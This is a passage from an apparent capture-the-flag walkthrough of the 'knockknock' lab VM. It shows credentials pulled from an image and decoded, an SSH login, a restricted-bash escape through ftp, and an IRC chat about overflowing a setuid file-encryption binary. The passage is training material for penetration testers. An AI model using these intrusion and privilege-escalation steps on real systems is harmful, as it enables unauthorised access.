<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# wget http://172.16.56.139/knockknock.jpg
</span><span class='line'>--2014-10-23 19:17:39--  http://172.16.56.139/knockknock.jpg
</span><span class='line'>Connecting to 172.16.56.139:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... <span class="m">200</span> OK
</span><span class='line'>Length: <span class="m">84741</span> <span class="o">(</span>83K<span class="o">)</span> <span class="o">[</span>image/jpeg<span class="o">]</span>
</span><span class='line'>Saving to: <span class="sb">`</span>knockknock.jpg<span class="s1">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="s1">100%[======================================================================================================================================================================================================&gt;] 84,741      --.-K/s   in 0s      </span>
</span><span class='line'>
</span><span class='line'><span class="s1">2014-10-23 19:17:39 (612 MB/s) - `knockknock.jpg&#39;</span> saved <span class="o">[</span>84741/84741<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>root@pwk:~# strings knockknock.jpg
</span><span class='line'>JFIF
</span><span class='line'>Ducky
</span><span class='line'>http://ns.adobe.com/xap/1.0/
</span><span class='line'>************************************ SNIP ! ************************************
</span><span class='line'>qW<span class="p">|</span>U
</span><span class='line'><span class="se">\+\U</span>
</span><span class='line'>Login Credentials
</span><span class='line'>abfnW
</span><span class='line'>sax2Cw9Ow
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Ooh, some possible credentials. They look like ROT13, so&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# python rot13.py abfnW
</span><span class='line'>nosaJ
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>OK, that&rsquo;s just Jason reversed, so I guess the same deal for the password.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# python rot13.py sax2Cw9Ow <span class="p">|</span> rev
</span><span class='line'>jB9jP2knf
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>These credentials can be used to SSH into the VM, which allows us to take a quick look around.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh jason@172.16.56.139
</span><span class='line'>jason@172.16.56.139<span class="err">&#39;</span>s password: jB9jP2knf
</span><span class='line'>Linux knockknock 3.2.0-4-486 <span class="c">#1 Debian 3.2.60-1+deb7u3 i686</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>You have new mail.
</span><span class='line'>Last login: Mon Oct  <span class="m">6</span> 12:33:37 <span class="m">2014</span> from 192.168.56.202
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>ls -l
</span><span class='line'>total 8
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root jason <span class="m">7457</span> Oct <span class="m">11</span> 18:35 tfc
</span><span class='line'>jason@knockknock:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Looks like we&rsquo;re in a restricted bash shell, so lets escape that quickly</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>./tfc
</span><span class='line'>-rbash: ./tfc: restricted: cannot specify <span class="sb">`</span>/<span class="err">&#39;</span> in <span class="nb">command </span>names
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>ftp
</span><span class='line'>ftp&gt; !
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>./tfc
</span><span class='line'>_______________________________
</span><span class='line'><span class="se">\_</span>_    ___/<span class="se">\_</span>   _____/<span class="se">\_</span>   ___ <span class="se">\</span>
</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>    __<span class="o">)</span>  /    <span class="se">\ </span> <span class="se">\/</span>
</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>     <span class="se">\ </span>  <span class="se">\ </span>    <span class="se">\_</span>___
</span><span class='line'>  <span class="p">|</span>____<span class="p">|</span>    <span class="se">\_</span>__  /    <span class="se">\_</span>_____  /
</span><span class='line'>                <span class="se">\/</span>            <span class="se">\/</span>
</span><span class='line'>
</span><span class='line'>  Tiny File Crypter - 1.0
</span><span class='line'>
</span><span class='line'>Usage: ./tfc &lt;filein.tfc&gt; &lt;fileout.tfc&gt;
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>OK, so the next part is probably explained a lot better by reading some IRC logs.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
<span class='line-number'>270</span>
<span class='line-number'>271</span>
<span class='line-number'>272</span>
<span class='line-number'>273</span>
<span class='line-number'>274</span>
<span class='line-number'>275</span>
<span class='line-number'>276</span>
<span class='line-number'>277</span>
<span class='line-number'>278</span>
<span class='line-number'>279</span>
<span class='line-number'>280</span>
<span class='line-number'>281</span>
<span class='line-number'>282</span>
<span class='line-number'>283</span>
<span class='line-number'>284</span>
<span class='line-number'>285</span>
<span class='line-number'>286</span>
<span class='line-number'>287</span>
<span class='line-number'>288</span>
<span class='line-number'>289</span>
<span class='line-number'>290</span>
<span class='line-number'>291</span>
<span class='line-number'>292</span>
<span class='line-number'>293</span>
<span class='line-number'>294</span>
<span class='line-number'>295</span>
<span class='line-number'>296</span>
<span class='line-number'>297</span>
<span class='line-number'>298</span>
<span class='line-number'>299</span>
<span class='line-number'>300</span>
<span class='line-number'>301</span>
<span class='line-number'>302</span>
<span class='line-number'>303</span>
<span class='line-number'>304</span>
<span class='line-number'>305</span>
<span class='line-number'>306</span>
<span class='line-number'>307</span>
<span class='line-number'>308</span>
<span class='line-number'>309</span>
<span class='line-number'>310</span>
<span class='line-number'>311</span>
<span class='line-number'>312</span>
<span class='line-number'>313</span>
<span class='line-number'>314</span>
<span class='line-number'>315</span>
<span class='line-number'>316</span>
<span class='line-number'>317</span>
<span class='line-number'>318</span>
<span class='line-number'>319</span>
<span class='line-number'>320</span>
<span class='line-number'>321</span>
<span class='line-number'>322</span>
<span class='line-number'>323</span>
<span class='line-number'>324</span>
<span class='line-number'>325</span>
<span class='line-number'>326</span>
<span class='line-number'>327</span>
<span class='line-number'>328</span>
<span class='line-number'>329</span>
<span class='line-number'>330</span>
<span class='line-number'>331</span>
<span class='line-number'>332</span>
<span class='line-number'>333</span>
<span class='line-number'>334</span>
<span class='line-number'>335</span>
<span class='line-number'>336</span>
<span class='line-number'>337</span>
<span class='line-number'>338</span>
<span class='line-number'>339</span>
<span class='line-number'>340</span>
<span class='line-number'>341</span>
<span class='line-number'>342</span>
<span class='line-number'>343</span>
<span class='line-number'>344</span>
<span class='line-number'>345</span>
<span class='line-number'>346</span>
<span class='line-number'>347</span>
<span class='line-number'>348</span>
<span class='line-number'>349</span>
<span class='line-number'>350</span>
<span class='line-number'>351</span>
<span class='line-number'>352</span>
<span class='line-number'>353</span>
<span class='line-number'>354</span>
<span class='line-number'>355</span>
<span class='line-number'>356</span>
<span class='line-number'>357</span>
<span class='line-number'>358</span>
<span class='line-number'>359</span>
<span class='line-number'>360</span>
<span class='line-number'>361</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>[2014-10-10T21:51:11+0100] &lt;recrudesce&gt; hey
</span><span class='line'>[2014-10-10T21:51:18+0100] &lt;recrudesce&gt; so, xcrypt
</span><span class='line'>[2014-10-10T21:51:36+0100] &lt;c0ne&gt; hey
</span><span class='line'>[2014-10-10T21:52:09+0100] &lt;recrudesce&gt; i see that the encryption changes based on the length
</span><span class='line'>[2014-10-10T21:52:28+0100] &lt;recrudesce&gt; so i figure you can send it an ascii string that actually creates a binary
</span><span class='line'>[2014-10-10T21:52:33+0100] &lt;recrudesce&gt; but it wont be suid, so not possible to run it
</span><span class='line'>[2014-10-10T21:53:23+0100] &lt;c0ne&gt; as in use tfc to make a file?
</span><span class='line'>[2014-10-10T21:53:50+0100] &lt;recrudesce&gt; yeah
</span><span class='line'>[2014-10-10T21:54:01+0100] &lt;recrudesce&gt; cos you can work out what ascii chars will relate to the correct hex values
</span><span class='line'>[2014-10-10T21:54:04+0100] &lt;recrudesce&gt; was just a thought
</span><span class='line'>[2014-10-10T21:54:18+0100] &lt;c0ne&gt; hmm it was not intended
</span><span class='line'>[2014-10-10T21:54:36+0100] &lt;recrudesce&gt; so if i needed a binary that was 3161 3161
</span><span class='line'>[2014-10-10T21:54:42+0100] &lt;recrudesce&gt; i can just encrypt a1a1
</span><span class='line'>[2014-10-10T21:54:52+0100] &lt;recrudesce&gt; and it&#39;ll create me a output with hex 3161 3161
</span><span class='line'>[2014-10-10T21:54:58+0100] &lt;recrudesce&gt; just chmod +x it and run it
</span><span class='line'>[2014-10-10T21:55:07+0100] &lt;recrudesce&gt; i guess i could work out what chars would result in the required hex.
</span><span class='line'>[2014-10-10T21:55:12+0100] &lt;recrudesce&gt; then encrypt that to generate the binary
</span><span class='line'>[2014-10-10T21:55:24+0100] &lt;c0ne&gt; could i push you allite bit ahead?
</span><span class='line'>[2014-10-10T21:55:30+0100] &lt;c0ne&gt; into some other road..
</span><span class='line'>[2014-10-10T21:55:35+0100] &lt;recrudesce&gt; but what&#39;s the point, cos i am only able to run that as jason
</span><span class='line'>[2014-10-10T21:55:42+0100] &lt;recrudesce&gt; so, it&#39;s something to do with xcrypt
</span><span class='line'>[2014-10-10T21:55:55+0100] &lt;recrudesce&gt; need to send something to xcrypt to make it create, or execute something
</span><span class='line'>[2014-10-10T21:55:57+0100] &lt;c0ne&gt; its a kinda classic vuln...
</span><span class='line'>[2014-10-10T21:56:11+0100] &lt;recrudesce&gt; so either buffer overflow or formatstr
</span><span class='line'>[2014-10-10T21:56:16+0100] &lt;recrudesce&gt; please dont let it be formatstr
</span><span class='line'>[2014-10-10T21:56:19+0100] &lt;c0ne&gt; first one
</span><span class='line'>[2014-10-10T21:56:22+0100] &lt;c0ne&gt; simple bof
</span><span class='line'>[2014-10-10T21:56:27+0100] &lt;c0ne&gt; but...
</span><span class='line'>[2014-10-10T21:56:55+0100] &lt;c0ne&gt; you need to figure out this xcrypt in order to be able to encrypt your payload
</span><span class='line'>[2014-10-10T21:57:47+0100] &lt;c0ne&gt; also regarding
</span><span class='line'>[2014-10-10T21:57:48+0100] &lt;c0ne&gt; [22:52] &lt;recrudesce&gt; i see that the encryption changes based on the length
</span><span class='line'>[2014-10-10T21:57:55+0100] &lt;c0ne&gt; yes and no...
</span><span class='line'>[2014-10-10T21:58:12+0100] &lt;c0ne&gt; the key will change depending on the length
</span><span class='line'>[2014-10-10T22:03:01+0100] &lt;c0ne&gt; basically it&#39;s a four byte key created from some init values and changes every time after crypting 4 bytes
</span><span class='line'>[2014-10-10T22:03:56+0100] &lt;recrudesce&gt; i can make it  segfault by passing it 1000 a&#39;s
</span><span class='line'>[2014-10-10T22:04:00+0100] &lt;recrudesce&gt; but only on the box
</span><span class='line'>[2014-10-10T22:04:02+0100] &lt;recrudesce&gt; not on my kali
</span><span class='line'>[2014-10-10T22:05:57+0100] &lt;c0ne&gt; 1000 a&#39;s kinda suprisses me
</span><span class='line'>[2014-10-10T22:06:09+0100] &lt;c0ne&gt; since the buffer is bigger
</span><span class='line'>[2014-10-10T22:06:21+0100] &lt;recrudesce&gt; i seg faulted it on 1000 a&#39;s
</span><span class='line'>[2014-10-10T22:06:45+0100] &lt;c0ne&gt; k
</span><span class='line'>[2014-10-10T22:06:51+0100] &lt;c0ne&gt; try something like 5000
</span><span class='line'>[2014-10-10T22:08:26+0100] &lt;recrudesce&gt; ok, i made it crash
</span><span class='line'>[2014-10-10T22:08:43+0100] &lt;recrudesce&gt; 725cce63
</span><span class='line'>[2014-10-10T22:08:48+0100] &lt;recrudesce&gt; but it&#39;s not in the pattern cos it&#39;s encrypting it
</span><span class='line'>[2014-10-10T22:08:56+0100] &lt;c0ne&gt; exactly
</span><span class='line'>[2014-10-10T22:11:35+0100] &lt;recrudesce&gt; you&#39;re evil
</span><span class='line'>[2014-10-10T22:11:45+0100] &lt;c0ne&gt; motherless child
</span><span class='line'>[2014-10-10T22:12:15+0100] &lt;recrudesce&gt; is the original key based off a static init value
</span><span class='line'>[2014-10-10T22:12:17+0100] &lt;recrudesce&gt; or a dynamic one
</span><span class='line'>[2014-10-10T22:12:24+0100] &lt;c0ne&gt; static
</span><span class='line'>[2014-10-10T22:12:26+0100] &lt;c0ne&gt; also
</span><span class='line'>[2014-10-10T22:12:31+0100] &lt;recrudesce&gt; so the first key is always the same
</span><span class='line'>[2014-10-10T22:12:33+0100] &lt;c0ne&gt; xcrypt is one way
</span><span class='line'>[2014-10-10T22:12:49+0100] &lt;c0ne&gt; so it either encrypts or decrypts
</span><span class='line'>[2014-10-10T22:14:10+0100] &lt;c0ne&gt; basicly what is does it
</span><span class='line'>[2014-10-10T22:14:53+0100] &lt;c0ne&gt; creates a 4byte key(dword) crypts a block of 4 bytes(dword) and then changes the key based on another static value
</span><span class='line'>[2014-10-10T22:15:18+0100] &lt;c0ne&gt; and its keeps changing for every loop round
</span><span class='line'>[2014-10-10T22:15:47+0100] &lt;recrudesce&gt; so essentially the key is the same on first loop
</span><span class='line'>[2014-10-10T22:15:52+0100] &lt;recrudesce&gt; and same on 2nd loop ?
</span><span class='line'>[2014-10-10T22:15:56+0100] &lt;c0ne&gt; also on the next
</span><span class='line'>[2014-10-10T22:16:00+0100] &lt;c0ne&gt; and so on...
</span><span class='line'>[2014-10-10T22:16:06+0100] &lt;recrudesce&gt; so no matter what i send it length wise, the 1st key is ALWAYS the same
</span><span class='line'>[2014-10-10T22:16:09+0100] &lt;recrudesce&gt; and so is the 2nd key
</span><span class='line'>[2014-10-10T22:16:12+0100] &lt;c0ne&gt; its a simple math mutation
</span><span class='line'>[2014-10-10T22:16:21+0100] &lt;recrudesce&gt; gotta work out how you generate the 2nd key
</span><span class='line'>[2014-10-10T22:16:27+0100] &lt;recrudesce&gt; work out what the first key is too
</span><span class='line'>[2014-10-10T22:16:41+0100] &lt;c0ne&gt; there is only one key
</span><span class='line'>[2014-10-10T22:16:41+0100] &lt;recrudesce&gt; then you can work out what the algorithm is to generate the keys
</span><span class='line'>[2014-10-10T22:16:47+0100] &lt;recrudesce&gt; yeah, but you mutate it
</span><span class='line'>[2014-10-10T22:16:53+0100] &lt;c0ne&gt; thats exactly what you need to do
</span><span class='line'>[2014-10-10T22:17:16+0100] &lt;c0ne&gt; see how the key is build and mutates
</span><span class='line'>[2014-10-10T22:18:28+0100] &lt;recrudesce&gt; v3 is the key
</span><span class='line'>[2014-10-10T22:18:35+0100] &lt;recrudesce&gt; in pseudo-c
</span><span class='line'>[2014-10-10T22:18:49+0100] &lt;recrudesce&gt; v3 = -367349345
</span><span class='line'>[2014-10-10T22:19:00+0100] &lt;c0ne&gt; make it hex please
</span><span class='line'>[2014-10-10T22:20:52+0100] &lt;recrudesce&gt; -0x15E54E61
</span><span class='line'>[2014-10-10T22:21:24+0100] &lt;c0ne&gt; yeah i just checked it
</span><span class='line'>[2014-10-10T22:21:30+0100] &lt;c0ne&gt; its the init value indeed
</span><span class='line'>[2014-10-10T22:21:47+0100] &lt;recrudesce&gt; ok, so the first key is 0x15E54E61 ?
</span><span class='line'>[2014-10-10T22:21:53+0100] &lt;recrudesce&gt; represented as an unsigned int
</span><span class='line'>[2014-10-10T22:21:58+0100] &lt;c0ne&gt; no
</span><span class='line'>[2014-10-10T22:22:05+0100] &lt;c0ne&gt; unsigned indeed
</span><span class='line'>[2014-10-10T22:22:11+0100] &lt;c0ne&gt; you show signed now
</span><span class='line'>[2014-10-10T22:22:57+0100] &lt;recrudesce&gt; ah, so signed -367349345 (15E54E61) is EA1AB19F unsigned ?
</span><span class='line'>[2014-10-10T22:23:04+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T22:23:06+0100] &lt;c0ne&gt; in ida
</span><span class='line'>[2014-10-10T22:23:09+0100] &lt;c0ne&gt; press h
</span><span class='line'>[2014-10-10T22:23:16+0100] &lt;c0ne&gt; when the value selected iirc
</span><span class='line'>[2014-10-10T22:24:48+0100] &lt;recrudesce&gt; but it shows 3927617951, not -367349345
</span><span class='line'>[2014-10-10T22:24:54+0100] &lt;recrudesce&gt; or am i being stupid ?
</span><span class='line'>[2014-10-10T22:25:05+0100] &lt;c0ne&gt; and when you press h again
</span><span class='line'>[2014-10-10T22:25:19+0100] &lt;recrudesce&gt; EA1AB19F
</span><span class='line'>[2014-10-10T22:25:24+0100] &lt;recrudesce&gt; but why is the signed different ?
</span><span class='line'>[2014-10-10T22:26:00+0100] &lt;c0ne&gt; it isnt
</span><span class='line'>[2014-10-10T22:26:05+0100] &lt;c0ne&gt; its the same value
</span><span class='line'>[2014-10-10T22:26:26+0100] &lt;recrudesce&gt; ok, i&#39;m confused
</span><span class='line'>[2014-10-10T22:26:37+0100] &lt;recrudesce&gt; in decompiled it shows as -367349345
</span><span class='line'>[2014-10-10T22:26:38+0100] &lt;c0ne&gt; open win calc
</span><span class='line'>[2014-10-10T22:26:52+0100] &lt;c0ne&gt; trow -367349345 in
</span><span class='line'>[2014-10-10T22:26:57+0100] &lt;c0ne&gt; and switch to hex
</span><span class='line'>[2014-10-10T22:27:03+0100] &lt;c0ne&gt; you will see
</span><span class='line'>[2014-10-10T22:27:22+0100] &lt;recrudesce&gt; FFFFFFFEA1AB19F
</span><span class='line'>[2014-10-10T22:27:30+0100] &lt;c0ne&gt; set it to dword
</span><span class='line'>[2014-10-10T22:27:38+0100] &lt;c0ne&gt; strips the left 32 bits
</span><span class='line'>[2014-10-10T22:27:40+0100] &lt;recrudesce&gt; ah ok
</span><span class='line'>[2014-10-10T22:27:42+0100] &lt;recrudesce&gt; yeah, sorry
</span><span class='line'>[2014-10-10T22:28:12+0100] &lt;recrudesce&gt; so that&#39;s the key in hex which is used as the key for the first 4 bytes
</span><span class='line'>[2014-10-10T22:28:28+0100] &lt;recrudesce&gt; then something is happening to that hex value to make the next key
</span><span class='line'>[2014-10-10T22:28:30+0100] &lt;c0ne&gt; its the base value indeed
</span><span class='line'>[2014-10-10T22:28:35+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T22:29:31+0100] &lt;recrudesce&gt; ok, so it looks like you&#39;re putting that value into ebp+ -0Ch
</span><span class='line'>[2014-10-10T22:30:25+0100] &lt;recrudesce&gt; looks like you&#39;re shifting it by 8
</span><span class='line'>[2014-10-10T22:30:37+0100] &lt;recrudesce&gt; possibly ?
</span><span class='line'>[2014-10-10T22:30:52+0100] &lt;c0ne&gt; more like shifting it by 1 , 8 times
</span><span class='line'>[2014-10-10T22:31:21+0100] &lt;recrudesce&gt; what&#39;s the difference between shifting it by 1 8 times or shifting it by 8
</span><span class='line'>[2014-10-10T22:32:42+0100] &lt;c0ne&gt; a2 &gt;&gt; 2
</span><span class='line'>[2014-10-10T22:32:48+0100] &lt;c0ne&gt; is the same as
</span><span class='line'>[2014-10-10T22:32:52+0100] &lt;c0ne&gt; a2 / 4
</span><span class='line'>[2014-10-10T22:33:09+0100] &lt;recrudesce&gt; ok
</span><span class='line'>[2014-10-10T22:35:15+0100] &lt;recrudesce&gt; bitwise operations
</span><span class='line'>[2014-10-10T22:35:24+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T22:37:29+0100] &lt;recrudesce&gt; so this key, is it used as hex ?
</span><span class='line'>[2014-10-10T22:37:36+0100] &lt;recrudesce&gt; or converted to something before use ?
</span><span class='line'>[2014-10-10T22:38:28+0100] &lt;c0ne&gt; hex is only a presentation
</span><span class='line'>[2014-10-10T22:38:41+0100] &lt;c0ne&gt; if you get me?
</span><span class='line'>[2014-10-10T22:38:46+0100] &lt;recrudesce&gt; yeah
</span><span class='line'>[2014-10-10T22:38:58+0100] &lt;recrudesce&gt; i&#39;m just trying to work out how this xcrypt works
</span><span class='line'>[2014-10-10T22:38:59+0100] &lt;c0ne&gt; its 32 bits value
</span><span class='line'>[2014-10-10T22:40:14+0100] &lt;c0ne&gt; in assembly you cant realy determ how the value is intended
